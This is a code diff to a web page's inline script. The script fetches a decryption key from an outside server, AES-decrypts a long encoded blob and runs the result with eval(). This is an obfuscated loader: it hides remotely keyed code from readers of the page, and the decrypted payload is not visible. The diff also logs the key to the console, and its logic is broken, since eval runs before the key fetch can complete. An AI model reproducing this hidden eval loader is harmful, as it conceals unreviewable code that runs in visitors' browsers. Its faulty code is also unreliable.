@@ -606,27 +606,31 @@
     </script>
     <script>
       let secretKey = '';
-      window.onload(()=>{
-        fetch("https://shinkansenfooddata.onrender.com/get-secret-key")
+
+      window.onload = () => {
+          fetch("https://shinkansenfooddata.onrender.com/get-secret-key")
               .then(response => response.json())
               .then(data => {
                   secretKey = data.secretKey;
-                  if (!data.secretKey) {
+                  if (!secretKey) {
                       throw new Error("Secret key not found in the response");
                   }
       
-                  const decodedText = decodeURIComponent(encodedText);
-                  const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
-                  return bytes.toString(CryptoJS.enc.Utf8);
+                  // Optional: If you need to perform some action after getting the key, do it here.
+                  console.log('Secret key fetched successfully:', secretKey);
               })
               .catch(error => {
-                  throw new Error(`Failed to fetch secret key or decode text: ${error}`);
+                  console.error(`Failed to fetch secret key or decode text: ${error}`);
               });
-      })
+      };
+      
       function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
-        return bytes.toString(CryptoJS.enc.Utf8);
+          if (!secretKey) {
+              throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
+          }
+          const decodedText = decodeURIComponent(encodedText);
+          const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
+          return bytes.toString(CryptoJS.enc.Utf8);
       }
       eval(aesDecode(`U2FsdGVkX18f5vVD37OWos1KhVUITT2TEKh12O8fzwILDIkDOZbCf%2BTUzFosnbwVsTGcQ5UEyg%2FiAT%2BKXTHwrObOJvFx0lSkcBnhnLSymrNxBuMKK%2BOLNp2v1uoGijDktNtFl26qBV16JSXTpY5gqk5vv8srm9uu%2FyKiLlPG7h6PXq9t%2B8wgBntZSX9Uu0gEOXhzlJTIPIBE%2FSIgBE3av5l2IsgSHNXuZHAT1ccSJXh18%2FGV57kR82D78JQscvGu2KAhWTs8p1VxEX7SYwpDdb8jSi9DHb82e2IAiB6SDB9auCxTWbV9uixKQnDmkfJ5gP9QMAyuI1voXDSxzuP5wsWSVvBJtm5fwioc5HYq%2Bp3Gp47bIXUvfai68orWxQvZDC03WYwKk1c5yB5W1N2TXotmWxe0mTOPWEJlria%2FKl6p%2BGaw8q4iAfGIMhbYhK0ExenrFbvtjbijla8mYgkkYG6soMeTeqjLudlQd9O5oOtblTVfJCn7DLOVyHiOkow2Lepi7BScZtfXv8nTeYB7DAn8CPuSnQbkiHjE87STFnwbqi%2FS02wz%2BpbFMbtbe0o%2BrorSQFIu%2F5nsAfEzyqUkhZXbXHi8%2FvAI%2BmHvDhdilzoPdLgvUWtl6vTdf4ywTX9ocm4iorift6FONXSlvZ%2BQmyLow26FARdkNo5B%2FsU1Pk9mgbhveE9kH67%2BE9BNXsBpa2MFi0pTEhd9bh8UEo1e4Yc21eJPDxO05Rjhgb46ihfYz3J5rkB8CZH8zv2kRboFjWpknCWXRSkKtcHGkbpcXIaZkJ3v1R79VfR5KIleqac1vi4gHY%2BOrEAIK0t7VzIsIDI5lS4AljNhaibA6QCBfW2n%2FKj4uXbnQco6kDFG%2B7Yo0keGOleCUEeA2g1sNNTQj2CU1vgpQW6afBUlVN1qvDot4hiJxQHVCMkKZG6BjaqR9Kecx%2BP0qUunhFF%2FSSMMJumquqjHWA6N9xYldEi54sNlJwUwPXDiL3kfdr8vVVPoITAoH6UhOQcXUfOP9tY1iHoHTJqIhMEc6UFj6kV09OEzINUbs%2F3ZfetZhr0T9obfa4jks1oSt8cobOAgOWcyFLacuAx4fAgwarvzfYzfG88J3EP0JlOX%2B%2FNojKZQqqzu4ZVBRvgXab2C2wpAfoXlv6HCXHQRyQRgKr2berZVLqdn2oCADirmYAx%2BU3ZQWG5LX%2Fr9kwfjcifxlzEMVTpA7XA9NZId28akp%2BE65%2F30tU3LjT05tB28F9jNhxaTrNTyuZc%2BAW9FudIQykvCwGwRAL3WUl%2F7%2BNjwphNtqBEL1j5nI19ScNsVi%2BPbyYD%2FP5OcZMR59aKkYoykJmzU%2FP%2BRx4fjxneYUwLAQ5C6KxA52Bqnh0pzI64QmGUDFDETbuwOqk7ulR5D%2FCcSg0TtUfDOsMI4Dc7%2FmEKYNLcQYy5SiTp4HSdU9hSphBQS3aGg8xUyxfW6m3NcJRPRmM0s%2F%2FACNfpqjkwyuZcqzSYSUO6nUuYux4lRUbazIS0feNs4B7Le3xbtxDSJeXzBUvs7SffW6%2BNAQjv%2BTOpv20O8%2FO7jcH%2Fla6wO0C8vwwHx0Y%2FXHU6zh9TBvorePYvST0tVT8M69iYrdNmEv1V3i13IaqECdAO7Y%2FKRnlTYKtdTIQvG%2FAtYlEuWE5WB3RvK%2B%2F0WlMY5BByYNKziwdimsfq7D9JhJXHul%2FlGn4IFBcIdZ2EJDKMBQKaw9qtvcOrwyF4JiMnvvNM7K4fjeC1%2F1y7bcjPA887kt32BAVb76BByPJUMvc8%3D`));
     </script>
